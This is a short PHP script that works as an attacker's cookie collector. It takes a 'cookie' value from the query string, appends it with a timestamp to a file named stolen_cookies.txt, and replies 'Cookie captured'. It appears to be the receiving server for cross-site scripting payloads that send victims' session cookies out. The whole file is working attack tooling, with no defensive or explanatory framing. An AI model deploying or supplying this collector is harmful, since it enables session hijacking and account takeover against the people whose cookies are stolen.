<?php
// Check if the 'cookie' parameter is set in the GET request
if (isset($_GET['cookie'])) {
  
  // Get the 'cookie' parameter value from the URL
  $cookie = $_GET['cookie'];
  
  // Set the path to the log file where the cookies will be stored
  $logfile = __DIR__ . '/stolen_cookies.txt';
  
  // Append the cookie data to the log file, along with a timestamp
  // The FILE_APPEND flag ensures new data is added to the end of the file
  file_put_contents($logfile, "[" . date("Y-m-d H:i:s") . "] " . $cookie . "\n", FILE_APPEND);
  
  // Display a confirmation message
  echo "Cookie captured";
} else {
  // Display a message if the 'cookie' parameter is missing
  echo "No cookie";
}
?>
